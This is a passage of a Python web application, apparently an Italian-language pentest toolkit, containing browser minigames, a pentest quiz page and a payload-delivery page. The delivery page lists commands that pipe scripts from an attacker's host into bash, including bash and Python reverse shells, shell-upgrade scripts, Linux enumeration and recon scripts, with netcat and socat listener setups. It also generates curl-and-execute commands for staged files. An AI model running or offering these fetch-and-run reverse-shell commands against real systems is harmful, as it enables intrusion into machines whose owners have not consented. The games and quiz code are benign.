  if(handTotal(player)===21){{finish();return;}}

  activeGame={{
    handle:function(cmd){{
      if(cmd==='hit'){{player.push(draw());if(handTotal(player)>=21)finish();else render(false);}}
      else if(cmd==='stand'){{finish();}}
      else if(cmd==='back'){{activeGame=null;showGames();}}
    }}
  }};
}}

/* -- WORDLE -- */
function initWordle(){{
  var word=WORDLE_WORDS[Math.floor(Math.random()*WORDLE_WORDS.length)].toLowerCase();
  var wlen=word.length,maxTries=6,row=0,col=0;
  var grid=[];for(var i=0;i<maxTries;i++)grid.push(new Array(wlen).fill(''));
  var keyStates={{}};
  var gameOver=false;

  function render(){{
    var h='<span class="t-head">Wordle</span> <span class="t-line">— indovina la parola di '+wlen+' lettere</span>\\n\\n';
    h+='<div class="wordle-grid">';
    for(var r=0;r<maxTries;r++){{
      h+='<div class="wordle-row" id="wr-'+r+'">';
      for(var c=0;c<wlen;c++){{
        var ch=grid[r][c]||'';
        var cls='wordle-cell';if(ch)cls+=' filled';
        h+='<div class="'+cls+'" id="wc-'+r+'-'+c+'">'+ch.toUpperCase()+'</div>';
      }}
      h+='</div>';
    }}
    h+='</div>';
    h+='<div class="wordle-kb">';
    var rows=['qwertyuiop','asdfghjkl','zxcvbnm'];
    for(var kr=0;kr<rows.length;kr++){{
      h+='<div class="wordle-kb-row">';
      if(kr===2)h+='<button class="wordle-key wide" data-key="Enter">Invio</button>';
      for(var ki=0;ki<rows[kr].length;ki++){{
        var k=rows[kr][ki];var kc='wordle-key';
        if(keyStates[k])kc+=' '+keyStates[k];
        h+='<button class="'+kc+'" data-key="'+k+'">'+k+'</button>';
      }}
      if(kr===2)h+='<button class="wordle-key wide" data-key="Backspace">&larr;</button>';
      h+='</div>';
    }}
    h+='</div>';
    h+='<div id="wd-msg" style="text-align:center;font-size:13px;min-height:18px;margin-top:6px"></div>';
    out.innerHTML=h;
    out.querySelectorAll('.wordle-key').forEach(function(b){{b.addEventListener('click',function(){{handleKey(b.dataset.key);}});}});
  }}

  function handleKey(k){{
    if(gameOver)return;
    if(k==='Backspace'){{if(col>0){{col--;grid[row][col]='';render();}}return;}}
    if(k==='Enter'){{if(col<wlen)return;checkRow();return;}}
    if(k.length===1&&k>='a'&&k<='z'&&col<wlen){{grid[row][col]=k;col++;render();}}
  }}

  function checkRow(){{
    var guess=grid[row].join('');
    var remaining=word.split('');
    var colors=new Array(wlen).fill('absent');
    for(var i=0;i<wlen;i++){{if(guess[i]===word[i]){{colors[i]='correct';remaining[i]=null;}}}}
    for(var i=0;i<wlen;i++){{if(colors[i]==='correct')continue;var idx=remaining.indexOf(guess[i]);if(idx>=0){{colors[i]='present';remaining[idx]=null;}}}}
    for(var i=0;i<wlen;i++){{
      var cell=document.getElementById('wc-'+row+'-'+i);
      cell.className='wordle-cell '+colors[i];
      var k=guess[i];
      if(!keyStates[k]||colors[i]==='correct'||(colors[i]==='present'&&keyStates[k]==='absent'))keyStates[k]=colors[i];
    }}
    render();
    for(var i=0;i<wlen;i++)document.getElementById('wc-'+row+'-'+i).className='wordle-cell '+colors[i];
    if(guess===word){{
      gameOver=true;
      document.getElementById('wd-msg').innerHTML='<span style="color:var(--green,#2ecc71)">Bravo! Indovinata in '+(row+1)+' tentativi!</span>';
      var note=gameReward(true);
      activeGame=null;
      setTimeout(function(){{
        out.innerHTML+='\\n<span class="t-line">'+note+'</span>\\n<span class="t-line">Digita <span class="t-accent">back</span> per tornare ai giochi</span>';
      }},500);
      return;
    }}
    row++;col=0;
    if(row>=maxTries){{
      gameOver=true;
      document.getElementById('wd-msg').innerHTML='<span style="color:var(--red,#e74c3c)">La parola era: <strong>'+word.toUpperCase()+'</strong></span>';
      var note=gameReward(false);
      activeGame=null;
      setTimeout(function(){{
        out.innerHTML+='\\n<span class="t-line">'+note+'</span>\\n<span class="t-line">Digita <span class="t-accent">back</span> per tornare ai giochi</span>';
      }},500);
    }}
  }}

  document.addEventListener('keydown',function wdKey(e){{
    if(activeGame!==wdGame){{document.removeEventListener('keydown',wdKey);return;}}
    if(e.key==='Backspace'||e.key==='Enter'){{handleKey(e.key);e.preventDefault();}}
    else if(e.key.length===1&&e.key>='a'&&e.key<='z')handleKey(e.key);
    else if(e.key.length===1&&e.key>='A'&&e.key<='Z')handleKey(e.key.toLowerCase());
  }});

  render();
  var wdGame={{
    handle:function(cmd){{
      if(cmd==='back'){{activeGame=null;showGames();}}
    }}
  }};
  activeGame=wdGame;
}}

/* -- GUESS -- */
function initGuess(){{
  var secret=Math.floor(Math.random()*100)+1;
  var maxTries=7,attempt=0,history=[];
  var guessOver=false;

  function render(){{
    var h='<span class="t-head">Indovina il numero</span> <span class="t-line">— da 1 a 100, '+maxTries+' tentativi</span>\\n\\n';
    if(history.length){{
      for(var i=0;i<history.length;i++){{
        var e=history[i];
        var col=e.dir==='correct'?'var(--green,#2ecc71)':e.dir==='low'?'var(--red,#e74c3c)':'var(--yellow,#f39c12)';
        var hint=e.dir==='correct'?'Esatto!':e.dir==='low'?'Troppo basso':'Troppo alto';
        h+='  <span style="color:'+col+'">'+e.val+' — '+hint+'</span>\\n';
      }}
      h+='\\n';
    }}
    if(!guessOver)h+='<span class="t-line">Tentativo '+(attempt+1)+'/'+maxTries+' — digita un numero</span>';
    out.innerHTML=h;
  }}

  render();
  activeGame={{
    handle:function(cmd){{
      if(cmd==='back'){{activeGame=null;showGames();return;}}
      var v=parseInt(cmd);
      if(isNaN(v)||v<1||v>100)return;
      attempt++;
      if(v===secret){{
        guessOver=true;
        history.push({{val:v,dir:'correct'}});
        render();
        var note=gameReward(true);
        out.innerHTML+='\\n<span class="t-line">'+note+'</span>\\n<span class="t-line">Digita <span class="t-accent">back</span> per tornare</span>';
        activeGame=null;return;
      }}
      history.push({{val:v,dir:v<secret?'low':'high'}});
      if(attempt>=maxTries){{
        guessOver=true;
        history.push({{val:secret,dir:'correct'}});
        render();
        var note=gameReward(false);
        out.innerHTML+='\\n<span style="color:var(--red,#e74c3c)">Era '+secret+'!</span>\\n<span class="t-line">'+note+'</span>\\n<span class="t-line">Digita <span class="t-accent">back</span> per tornare</span>';
        activeGame=null;return;
      }}
      render();
    }}
  }};
}}

/* -- 8BALL -- */
function init8Ball(){{
  termOut(
    '<span class="t-head">8Ball</span> <span class="t-line">— fai una domanda al sealion</span>\\n\\n'+
    '<div class="ball-circle" id="bl-circle"><div class="ball-inner">8</div></div>\\n'+
    '<span class="t-line">Digita la tua domanda...</span>'
  );
  activeGame={{
    handle:function(cmd){{
      if(cmd==='back'){{activeGame=null;showGames();return;}}
      var circle=document.getElementById('bl-circle');
      if(circle)circle.classList.add('shaking');
      setTimeout(function(){{
        if(circle)circle.classList.remove('shaking');
        var ans=BALL_ANSWERS[Math.floor(Math.random()*BALL_ANSWERS.length)];
        var note=gameReward('draw');
        termOut(
          '<span class="t-head">8Ball</span>\\n\\n'+
          '<div class="ball-circle"><div class="ball-inner">8</div></div>\\n'+
          '<span class="t-accent" style="font-style:italic;display:block;text-align:center;margin:8px 0">'+ans+'</span>\\n\\n'+
          '<span class="t-line">'+note+'</span>\\n'+
          '<span class="t-line">Fai un\\\'altra domanda o digita <span class="t-accent">back</span></span>'
        );
      }},700);
    }}
  }};
}}

}})();
</script>
"""
    return _base_html("Pet Portal", body, active="pet")


def _load_pentest_questions() -> dict:
    """Carica e valida la banca del minigame senza rendere fragile SLWeb."""
    fallback = {
        "schema_version": 1,
        "default_question_count": 10,
        "questions": [],
        "load_error": "Banca domande non disponibile.",
    }
    try:
        data = json.loads(PENTEST_QUESTIONS_FILE.read_text(encoding="utf-8"))
        questions = data.get("questions") if isinstance(data, dict) else None
        if not isinstance(questions, list):
            raise ValueError("Il campo questions deve essere un array")
        seen: set[int] = set()
        valid: list[dict] = []
        for question in questions:
            if not isinstance(question, dict):
                continue
            qid = question.get("id")
            if not isinstance(qid, int) or qid in seen:
                continue
            required = ("category", "topic", "difficulty", "type", "question", "answer", "explanation")
            if any(not isinstance(question.get(key), str) or not question.get(key).strip() for key in required):
                continue
            if question["difficulty"] not in {"Base", "Intermedio", "Avanzato", "EXTREME"}:
                continue
            if question["type"] not in {"multiple_choice", "completion"}:
                continue
            if question["type"] == "multiple_choice":
                choices = question.get("choices")
                if not isinstance(choices, list) or len(choices) < 2:
                    continue
                if sum(bool(choice.get("correct")) for choice in choices if isinstance(choice, dict)) != 1:
                    continue
            elif "____" not in question["question"]:
                continue
            seen.add(qid)
            valid.append(question)
        data["questions"] = valid
        data["load_error"] = "" if valid else "La banca JSON non contiene domande valide."
        return data
    except Exception as exc:
        fallback["load_error"] = f"Impossibile caricare la banca domande: {exc}"
        return fallback


def _page_minigame() -> str:
    payload = json.dumps(_load_pentest_questions(), ensure_ascii=False).replace("</", "<\\/")
    body = f"""\
<style>
body{{overflow:hidden}}
.quiz-app{{height:calc(100vh - 45px);min-height:560px;background:var(--bg);display:grid;grid-template-rows:auto 1fr auto;position:relative}}
.quiz-top{{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:16px;padding:14px 22px;border-bottom:1px solid var(--border);background:var(--surface)}}
.quiz-left{{display:flex;align-items:center;gap:10px;min-width:0}}.quiz-title{{font-size:13px;font-weight:700;color:var(--accent);white-space:nowrap}}
.quiz-progress{{font-size:12px;color:var(--text2);text-align:center}}.quiz-score{{justify-self:end;font-size:12px;color:var(--text2);white-space:nowrap}}
.quiz-icon{{width:40px;height:40px;border:1px solid var(--border);background:var(--bg);color:var(--text);border-radius:8px;display:grid;place-items:center;cursor:pointer;font:700 20px/1 inherit}}
.quiz-icon:hover{{border-color:var(--accent);color:var(--accent);background:var(--hover)}}
.quiz-stage{{min-height:0;overflow-y:auto;padding:clamp(20px,5vh,58px) clamp(18px,7vw,96px);display:flex;justify-content:center}}
.quiz-card{{width:min(100%,980px);align-self:center}}.quiz-meta{{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:18px}}
.quiz-chip{{font-size:11px;letter-spacing:.2px;border:1px solid var(--border);background:var(--surface);color:var(--text2);padding:5px 9px;border-radius:999px}}
.quiz-chip.id{{color:var(--green);border-color:rgba(63,185,80,.35)}}.quiz-chip.level{{color:var(--yellow)}}
.quiz-question{{font-size:clamp(22px,3vw,36px);line-height:1.32;font-weight:700;color:var(--text);margin:0 0 28px;letter-spacing:-.02em}}
.quiz-options{{display:grid;grid-template-columns:1fr 1fr;gap:12px}}.quiz-option{{text-align:left;border:1px solid var(--border);background:var(--surface);color:var(--text);border-radius:9px;padding:15px 17px;font:inherit;line-height:1.45;cursor:pointer;display:flex;gap:12px;transition:.15s}}
.quiz-option:hover:not(:disabled){{border-color:var(--accent);transform:translateY(-1px)}}.quiz-option .letter{{color:var(--accent);font-weight:800;flex:0 0 auto}}
.quiz-option.correct{{border-color:var(--green);background:rgba(63,185,80,.1)}}.quiz-option.wrong{{border-color:var(--red);background:rgba(248,81,73,.1)}}.quiz-option:disabled{{cursor:default;color:var(--text)}}
.quiz-question.completion{{white-space:pre-wrap}}
.quiz-inline-input{{display:inline-block;width:clamp(120px,30vw,340px);min-width:8ch;margin:0 .18em;padding:.12em .35em;border:0;border-bottom:2px solid var(--accent);background:var(--surface);color:var(--accent2);border-radius:4px 4px 0 0;font:inherit;font-weight:700;line-height:1.25;outline:none;vertical-align:baseline}}
.quiz-inline-input:focus{{background:var(--surface2);box-shadow:0 3px 0 rgba(88,166,255,.15)}}.quiz-inline-input:disabled{{color:var(--text2);border-color:var(--border)}}
.quiz-actions{{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}}
.quiz-btn{{border:1px solid var(--border);background:var(--surface);color:var(--text);border-radius:7px;padding:10px 15px;font:600 13px inherit;cursor:pointer}}
.quiz-btn:hover{{border-color:var(--accent);color:var(--accent)}}.quiz-btn.primary{{background:var(--accent);border-color:var(--accent);color:var(--bg)}}
.quiz-feedback{{margin-top:20px;border-left:3px solid var(--accent);background:var(--surface);padding:16px 18px;border-radius:0 8px 8px 0}}
.quiz-feedback.good{{border-color:var(--green)}}.quiz-feedback.bad{{border-color:var(--red)}}.quiz-feedback h3{{font-size:14px;margin:0 0 7px;color:var(--text)}}.quiz-feedback p{{font-size:13px;line-height:1.6;color:var(--text2);margin:6px 0}}.quiz-feedback strong{{color:var(--text)}}
.quiz-nav{{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;padding:12px 22px;border-top:1px solid var(--border);background:var(--surface)}}
.quiz-arrow{{width:48px;height:44px;border:1px solid var(--border);border-radius:8px;background:var(--bg);color:var(--text);font-size:23px;cursor:pointer}}.quiz-arrow:hover:not(:disabled){{border-color:var(--accent);color:var(--accent)}}.quiz-arrow:disabled{{opacity:.3;cursor:default}}#quiz-next{{justify-self:end}}
.quiz-nav-status{{font-size:11px;color:var(--text2);text-align:center}}.quiz-dots{{display:flex;gap:4px;justify-content:center;margin-top:5px;max-width:50vw;flex-wrap:wrap}}.quiz-dot{{width:6px;height:6px;border-radius:50%;background:var(--border)}}.quiz-dot.current{{background:var(--accent)}}.quiz-dot.done{{background:var(--green)}}
.quiz-settings{{position:fixed;inset:45px auto 0 0;width:min(390px,100%);background:var(--surface);border-right:1px solid var(--border);z-index:120;transform:translateX(-102%);transition:transform .2s;box-shadow:12px 0 32px rgba(0,0,0,.35);display:flex;flex-direction:column}}.quiz-settings.open{{transform:translateX(0)}}
.quiz-settings-head{{display:flex;align-items:center;justify-content:space-between;padding:18px;border-bottom:1px solid var(--border)}}.quiz-settings-head h2{{font-size:17px;margin:0}}.quiz-settings-body{{padding:18px;overflow-y:auto;flex:1}}.quiz-field{{margin-bottom:21px}}.quiz-field>label,.quiz-label{{display:block;color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:.7px;font-weight:700;margin-bottom:9px}}
.quiz-checks{{display:flex;flex-direction:column;gap:7px}}.quiz-check{{display:flex;align-items:flex-start;gap:9px;font-size:13px;color:var(--text);cursor:pointer}}.quiz-check input{{accent-color:var(--accent);margin-top:2px}}
.quiz-number{{width:100%;border:1px solid var(--border);background:var(--bg);color:var(--text);border-radius:7px;padding:10px 12px;font:inherit;outline:none}}.quiz-number:focus{{border-color:var(--accent)}}
.quiz-settings-foot{{padding:15px 18px;border-top:1px solid var(--border);display:flex;gap:9px}}.quiz-settings-foot .quiz-btn{{flex:1}}
.quiz-scrim{{position:fixed;inset:45px 0 0;background:rgba(0,0,0,.55);z-index:110;display:none}}.quiz-scrim.open{{display:block}}
.quiz-empty{{text-align:center;color:var(--text2);align-self:center}}.quiz-empty h2{{color:var(--text);margin-bottom:8px}}.quiz-back{{color:var(--text2);text-decoration:none;font-size:12px}}.quiz-back:hover{{color:var(--accent)}}
@media(max-width:768px){{body{{overflow:auto}}.quiz-app{{height:calc(100dvh - 86px);min-height:520px}}.quiz-top{{grid-template-columns:1fr auto;padding:9px 12px}}.quiz-title{{font-size:12px}}.quiz-progress{{display:none}}.quiz-score{{font-size:11px}}.quiz-stage{{padding:24px 14px}}.quiz-card{{align-self:flex-start}}.quiz-question{{font-size:22px;margin-bottom:20px}}.quiz-options{{grid-template-columns:1fr}}.quiz-option{{padding:13px;font-size:13px}}.quiz-inline-input{{width:min(100%,280px);margin:.3em 0}}.quiz-nav{{padding:8px 12px}}.quiz-arrow{{width:46px;height:42px}}.quiz-settings{{inset:0 auto 0 0}}.quiz-scrim{{inset:0}}.quiz-meta{{margin-bottom:12px}}.quiz-chip{{font-size:10px}}}}
@media(max-width:420px){{.quiz-title{{display:none}}.quiz-question{{font-size:19px}}.quiz-stage{{padding-top:18px}}.quiz-nav-status>span{{display:none}}}}
</style>

<main class="quiz-app" id="quiz-app">
  <header class="quiz-top">
    <div class="quiz-left">
      <button class="quiz-icon" id="quiz-settings-open" type="button" aria-label="Configura minigame" title="Configura">&#8942;</button>
      <span class="quiz-title">PET // PENTEST MINIGAME</span>
      <a class="quiz-back" id="quiz-back" href="/pet">&larr; Pet</a>
    </div>
    <div class="quiz-progress" id="quiz-progress">Domanda 1 / 10</div>
    <div class="quiz-score" id="quiz-score">0 risposte</div>
  </header>
  <section class="quiz-stage" id="quiz-stage"></section>
  <footer class="quiz-nav">
    <button class="quiz-arrow" id="quiz-prev" type="button" aria-label="Domanda precedente">&#8592;</button>
    <div class="quiz-nav-status"><span>Usa le frecce per navigare</span><div class="quiz-dots" id="quiz-dots"></div></div>
    <button class="quiz-arrow" id="quiz-next" type="button" aria-label="Domanda successiva">&#8594;</button>
  </footer>
</main>
<div class="quiz-scrim" id="quiz-scrim"></div>
<aside class="quiz-settings" id="quiz-settings" aria-hidden="true">
  <div class="quiz-settings-head"><h2>Configura sessione</h2><button class="quiz-icon" id="quiz-settings-close" type="button" aria-label="Chiudi">&times;</button></div>
  <div class="quiz-settings-body">
    <div class="quiz-field"><label for="quiz-count">Numero di domande</label><input class="quiz-number" id="quiz-count" type="number" min="1" max="500" value="10"></div>
    <div class="quiz-field"><span class="quiz-label">Categorie</span><div class="quiz-checks" id="quiz-categories"></div></div>
    <div class="quiz-field"><span class="quiz-label">Livello</span><div class="quiz-checks" id="quiz-levels"></div></div>
    <div class="quiz-field"><span class="quiz-label">Tipo</span><div class="quiz-checks" id="quiz-types"></div></div>
  </div>
  <div class="quiz-settings-foot"><button class="quiz-btn" id="quiz-select-all" type="button">Seleziona tutto</button><button class="quiz-btn primary" id="quiz-start" type="button">Nuova sessione</button></div>
</aside>

<script id="quiz-data" type="application/json">{payload}</script>
<script>
(function(){{
'use strict';
var DATA=JSON.parse(document.getElementById('quiz-data').textContent);
var BANK=Array.isArray(DATA.questions)?DATA.questions:[];
var app=document.getElementById('quiz-app'),stage=document.getElementById('quiz-stage');
var settings=document.getElementById('quiz-settings'),scrim=document.getElementById('quiz-scrim');
var session=[],position=0,responses={{}};
var labels={{multiple_choice:'Scelta multipla',completion:'Completamento'}};
var baseMeta=document.querySelector('meta[name="base-path"]');
var base=baseMeta?baseMeta.content:'/';document.getElementById('quiz-back').href=base+'pet';

function unique(key){{return BANK.map(function(q){{return q[key];}}).filter(function(v,i,a){{return a.indexOf(v)===i;}});}}
function escText(value){{return value==null?'':String(value);}}
function shuffle(items){{var a=items.slice();for(var i=a.length-1;i>0;i--){{var j=Math.floor(Math.random()*(i+1)),t=a[i];a[i]=a[j];a[j]=t;}}return a;}}
function checkbox(container,value,name,checked){{var label=document.createElement('label');label.className='quiz-check';var input=document.createElement('input');input.type='checkbox';input.value=value;input.name=name;input.checked=checked;var span=document.createElement('span');span.textContent=value;label.append(input,span);container.appendChild(label);}}
function buildSettings(){{
  var saved={{}};try{{saved=JSON.parse(localStorage.getItem('sl_quiz_settings')||'{{}}');}}catch(e){{}}
  if(saved.schemaVersion!==DATA.schema_version){{saved={{levels:['Base'],types:['multiple_choice','completion']}};}}
  if(saved.types&&saved.types.indexOf('open_text')>=0){{saved.types=saved.types.filter(function(v){{return v!=='open_text';}});saved.types.push('completion');}}
  document.getElementById('quiz-count').value=Math.max(1,Math.min(500,parseInt(saved.count||DATA.default_question_count||10)));
  var cats=unique('category'),levels=['Base','Intermedio','Avanzato','EXTREME'],types=['multiple_choice','completion'];
  cats.forEach(function(v){{checkbox(document.getElementById('quiz-categories'),v,'category',!saved.categories||saved.categories.indexOf(v)>=0);}});
  levels.forEach(function(v){{checkbox(document.getElementById('quiz-levels'),v,'level',saved.levels?saved.levels.indexOf(v)>=0:v==='Base');}});
  types.forEach(function(v){{checkbox(document.getElementById('quiz-types'),v,'type',!saved.types||saved.types.indexOf(v)>=0);var all=document.querySelectorAll('input[name=type]');all[all.length-1].nextSibling.textContent=labels[v];}});
}}
function selected(name){{return Array.from(document.querySelectorAll('input[name="'+name+'"]:checked')).map(function(x){{return x.value;}});}}
function openSettings(){{settings.classList.add('open');scrim.classList.add('open');settings.setAttribute('aria-hidden','false');}}
function closeSettings(){{settings.classList.remove('open');scrim.classList.remove('open');settings.setAttribute('aria-hidden','true');}}
function balancedPick(pool,count){{
  var picked=[],used={{}},groups={{}};shuffle(pool).forEach(function(q){{(groups[q.category]||(groups[q.category]=[])).push(q);}});
  var keys=shuffle(Object.keys(groups));while(picked.length<count){{var advanced=false;for(var i=0;i<keys.length&&picked.length<count;i++){{var list=groups[keys[i]];while(list.length&&used[list[0].id])list.shift();if(list.length){{var q=list.shift();picked.push(q);used[q.id]=1;advanced=true;}}}}if(!advanced)break;}}
  // Se entrambi i tipi sono richiesti, garantisce una sessione realmente mista quando possibile.
  if(count>1){{
    ['multiple_choice','completion'].forEach(function(type){{
      if(pool.some(function(q){{return q.type===type;}}) && !picked.some(function(q){{return q.type===type;}})){{
        var replacement=shuffle(pool).find(function(q){{return q.type===type&&!used[q.id];}});
        if(replacement){{
          used[picked[picked.length-1].id]=0;
          picked[picked.length-1]=replacement;
          used[replacement.id]=1;
        }}
      }}
    }});
  }}
  return shuffle(picked);
}}
function startSession(){{
  var categories=selected('category'),levels=selected('level'),types=selected('type');
  if(!categories.length||!levels.length||!types.length){{alert('Seleziona almeno una categoria, un livello e un tipo.');return;}}
  var pool=BANK.filter(function(q){{return categories.indexOf(q.category)>=0&&levels.indexOf(q.difficulty)>=0&&types.indexOf(q.type)>=0;}});
  if(!pool.length){{alert('Nessuna domanda corrisponde ai filtri.');return;}}
  var count=Math.max(1,Math.min(pool.length,parseInt(document.getElementById('quiz-count').value)||10));
  localStorage.setItem('sl_quiz_settings',JSON.stringify({{schemaVersion:DATA.schema_version,count:count,categories:categories,levels:levels,types:types}}));
  session=balancedPick(pool,count);position=0;responses={{}};closeSettings();render();
}}
function setNode(tag,className,text){{var n=document.createElement(tag);if(className)n.className=className;if(text!==undefined)n.textContent=text;return n;}}
function normalizeAnswer(value){{return String(value||'').trim().toLocaleLowerCase('it').replace(/\\s+/g,' ');}}
function completionIsCorrect(q,value){{var accepted=Array.isArray(q.accepted_answers)&&q.accepted_answers.length?q.accepted_answers:[q.answer];return accepted.some(function(answer){{return normalizeAnswer(answer)===normalizeAnswer(value);}});}}
function renderFeedback(parent,q,response){{
  var box=setNode('div','quiz-feedback '+(response.correct===false?'bad':'good'));
  if(q.type==='multiple_choice'){{
    var choice=q.choices[response.selected];box.appendChild(setNode('h3','',response.correct?'Risposta corretta':'Risposta errata'));
    box.appendChild(setNode('p','',choice&&choice.explanation?choice.explanation:q.explanation));
    if(!response.correct){{var correct=q.choices.find(function(c){{return c.correct;}});var p=setNode('p');p.appendChild(setNode('strong','','Risposta corretta: '));p.appendChild(document.createTextNode(correct?correct.text:q.answer));box.appendChild(p);}}
  }}else{{
    box.appendChild(setNode('h3','',response.correct?'Completamento corretto':'Completamento errato'));
    var solution=setNode('p');solution.appendChild(setNode('strong','','Risposta: '));solution.appendChild(document.createTextNode(q.answer));box.appendChild(solution);
    var why=setNode('p');why.appendChild(setNode('strong','','Perché: '));why.appendChild(document.createTextNode(q.explanation));box.appendChild(why);
    if(q.reference_answer){{var full=setNode('p');full.appendChild(setNode('strong','','Testo completo: '));full.appendChild(document.createTextNode(q.reference_answer));box.appendChild(full);}}
  }}
  parent.appendChild(box);
}}
function render(){{
  stage.innerHTML='';
  if(!BANK.length){{var empty=setNode('div','quiz-empty');empty.appendChild(setNode('h2','','Minigame non disponibile'));empty.appendChild(setNode('p','',DATA.load_error||'Nessuna domanda valida nel JSON.'));stage.appendChild(empty);document.getElementById('quiz-prev').disabled=true;document.getElementById('quiz-next').disabled=true;return;}}
  if(!session.length){{startSession();return;}}
  var q=session[position],response=responses[q.id]||(responses[q.id]={{answered:false,draft:''}}),card=setNode('article','quiz-card');
  var meta=setNode('div','quiz-meta');[['quiz-chip id','ID #'+q.id],['quiz-chip',q.category],['quiz-chip',q.topic],['quiz-chip level',q.difficulty],['quiz-chip',labels[q.type]||q.type]].forEach(function(x){{meta.appendChild(setNode('span',x[0],x[1]));}});card.appendChild(meta);
  if(q.type==='multiple_choice'){{
    card.appendChild(setNode('h1','quiz-question',q.question));
    var options=setNode('div','quiz-options');q.choices.forEach(function(choice,index){{var button=setNode('button','quiz-option');button.type='button';var letter=setNode('span','letter',String.fromCharCode(65+index));button.append(letter,setNode('span','',choice.text));if(response.answered){{button.disabled=true;if(choice.correct)button.classList.add('correct');if(index===response.selected&&!choice.correct)button.classList.add('wrong');}}button.onclick=function(){{if(response.answered)return;response.answered=true;response.selected=index;response.correct=!!choice.correct;render();}};options.appendChild(button);}});card.appendChild(options);
  }}else{{
    var prompt=setNode('h1','quiz-question completion'),parts=String(q.question).split('____'),answerInput=document.createElement('input');
    answerInput.className='quiz-inline-input';answerInput.type='text';answerInput.autocomplete='off';answerInput.spellcheck=false;answerInput.placeholder='completa';answerInput.setAttribute('aria-label','Testo mancante');answerInput.value=response.draft||'';answerInput.disabled=response.answered;
    parts.forEach(function(part,index){{prompt.appendChild(document.createTextNode(part));if(index<parts.length-1)prompt.appendChild(index===0?answerInput:document.createTextNode('____'));}});card.appendChild(prompt);
    answerInput.addEventListener('input',function(){{response.draft=answerInput.value;}});
    if(!response.answered){{var actions=setNode('div','quiz-actions');var check=setNode('button','quiz-btn primary','Verifica risposta');check.type='button';check.onclick=function(){{response.draft=answerInput.value;if(!response.draft.trim()){{answerInput.focus();return;}}response.answered=true;response.correct=completionIsCorrect(q,response.draft);render();}};answerInput.addEventListener('keydown',function(event){{if(event.key==='Enter'){{event.preventDefault();check.click();}}}});actions.appendChild(check);card.appendChild(actions);setTimeout(function(){{answerInput.focus();}},0);}}
  }}
  if(response.answered)renderFeedback(card,q,response);stage.appendChild(card);stage.scrollTop=0;
  var answered=Object.keys(responses).filter(function(id){{return responses[id].answered;}}).length,graded=Object.keys(responses).filter(function(id){{return responses[id].correct!==null&&responses[id].correct!==undefined;}}),correct=graded.filter(function(id){{return responses[id].correct;}}).length;
  document.getElementById('quiz-progress').textContent='Domanda '+(position+1)+' / '+session.length;
  document.getElementById('quiz-score').textContent=answered+' risposte · '+correct+'/'+graded.length+' corrette';
  document.getElementById('quiz-prev').disabled=position===0;document.getElementById('quiz-next').disabled=position===session.length-1;
  var dots=document.getElementById('quiz-dots');dots.innerHTML='';session.forEach(function(item,i){{var d=setNode('span','quiz-dot'+(i===position?' current':'')+(responses[item.id]&&responses[item.id].answered?' done':''));dots.appendChild(d);}});
}}
buildSettings();
document.getElementById('quiz-settings-open').onclick=openSettings;document.getElementById('quiz-settings-close').onclick=closeSettings;scrim.onclick=closeSettings;
document.getElementById('quiz-start').onclick=startSession;document.getElementById('quiz-select-all').onclick=function(){{document.querySelectorAll('.quiz-settings input[type=checkbox]').forEach(function(x){{x.checked=true;}});}};
document.getElementById('quiz-prev').onclick=function(){{if(position>0){{position--;render();}}}};document.getElementById('quiz-next').onclick=function(){{if(position<session.length-1){{position++;render();}}}};
document.addEventListener('keydown',function(event){{var tag=document.activeElement&&document.activeElement.tagName;if(tag==='TEXTAREA'||tag==='INPUT')return;if(event.key==='ArrowLeft'&&position>0){{position--;render();}}if(event.key==='ArrowRight'&&position<session.length-1){{position++;render();}}if(event.key==='Escape')closeSettings();}});
if(BANK.length)startSession();else render();
}})();
</script>
"""
    return _base_html("Pentest Minigame", body, active="pet")


def _page_delivery() -> str:
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://&lt;LHOST&gt;:2727"

    ep_cards = ""
    endpoints = [
        ("upgrade", "Upgrade Shell", "Trasforma una shell instabile in una TTY interattiva (socat/python pty)",
         f"curl {base}/upgrade | bash",
         f"Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code>"),
        ("upgrade2", "Upgrade In-Place", "Upgrada la shell corrente a TTY senza aprire nuove connessioni (python pty, script, expect, perl)",
         f"curl {base}/upgrade2 | bash",
         "Nessun prerequisito — eseguilo direttamente nella shell del target"),
        ("rev", "Reverse Shell Bash", "One-liner bash per reverse shell",
         f"curl {base}/rev | bash",
         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
        ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
         f"curl {base}/sh | bash",
         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
         f"curl {base}/linseal?ol | sh",
         "Nessun prerequisito — POSIX sh puro"),
        ("static/slrecon.sh", "SLRecon", "Recon automatica: nmap 2-step, web enum, service enum, report. Opzioni: ?o salva, ?ol output+loot, ?ols silenzioso+loot",
         f"curl {base}/slrecon?ol | sh -s -- TARGET",
         "Prerequisito: <code>nmap</code> installato sul target"),
    ]
    for key, title, desc, curl_cmd, prereq in endpoints:
        ep_cards += f"""<div class="delivery-card">
<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
<div class="dc-desc">{desc}</div>
<div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
<div class="dc-prereq">{prereq}</div>
</div>\n"""

    files = []
    if STATIC_ROOT.is_dir():
        files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))

    file_rows = ""
    for f in files:
        name = f.name
        size = f.stat().st_size
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        if name.endswith(".sh"):
            cmd = f"curl {base}/{name} | bash"
        elif name.endswith(".exe"):
            cmd = f"curl {base}/{name} -o {name}"
        else:
            cmd = f"curl {base}/{name} -o {name} &amp;&amp; chmod +x {name}"
        file_rows += f"""<tr>
<td class="dc-fname">{html.escape(name)}</td>
<td class="dc-fsize">{label}</td>
<td class="dc-fcmd"><code>{cmd}</code></td></tr>\n"""

    if not file_rows:
